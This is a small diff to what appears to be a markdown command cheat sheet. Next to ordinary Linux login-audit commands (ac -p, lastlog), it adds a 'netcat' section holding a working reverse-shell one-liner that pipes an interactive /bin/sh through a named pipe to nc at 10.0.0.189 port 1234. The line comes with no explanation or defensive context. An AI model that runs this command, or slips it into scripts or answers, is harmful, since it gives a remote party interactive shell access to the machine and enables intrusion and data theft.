@@ -81,6 +81,12 @@ ac -p
 lastlog
 ```
 
+### netcat
+
+```bash
+rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234 > /tmp/pipe
+```
+
 ### Services & Apps
 
 https://www.crowdstrike.com/
